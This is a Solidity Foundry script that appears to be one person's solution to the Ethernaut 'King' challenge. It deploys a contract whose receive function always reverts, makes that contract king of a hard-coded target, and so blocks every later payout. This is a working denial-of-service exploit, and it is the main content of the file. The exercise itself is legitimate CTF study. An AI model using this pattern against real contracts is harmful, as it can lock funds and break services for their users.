// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {King} from "../src/King.sol";

contract CantReceiveContract {

    constructor() payable {}

    /**
     * @notice Allows the contract to try to transfer ether to a specified recipient.
     * @param _recepient The address to transfer ether to.
     */
    function becomeKing(address _recepient) external payable {
        (bool success, ) = address(_recepient).call{value: 1e15}(""); 
        require(success, "call failed");
    }

    /**
     * @notice Makes it clear that the contract cannot receive any Ether.
     * @dev The `receive` function reverts any incoming Ether.
     */
    receive() external payable {
        revert();
    }

}

/// @author agadzhalov
/// @title Solution to King Ethernaut challenge
/// @notice Solution: 
///         The strategy is to deploy a contract with initial funds but without a `receive` or `fallback` function, 
///         so that it cannot accept any funds. Once this contract becomes the king, the transfer from the `King` 
///         contract won't work, breaking the game.
contract KingScript is Script {
    /// @notice Instance of the King contract to interact with.
    King public king = King(payable(0x9C9892dA50B808Cb623103A8dDf1256ea398505e));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Deploy the CantReceiveContract with an initial balance
        CantReceiveContract cantReceiver = new CantReceiveContract{value: 1e15}();

        // Log the current king before the exploit
        console.log("1. Current king:", king._king());

        // Use the deployed contract to attempt to become the king
        cantReceiver.becomeKing(0x9C9892dA50B808Cb623103A8dDf1256ea398505e);

        // Log the new king after the exploit
        console.log("2. New king:", king._king());

        // Attempt to transfer Ether to the King contract, which should fail
        (bool success, ) = address(king).call{value: 1e16}(""); 
        require(success, "Can't become king");

        vm.stopBroadcast();
    }
}
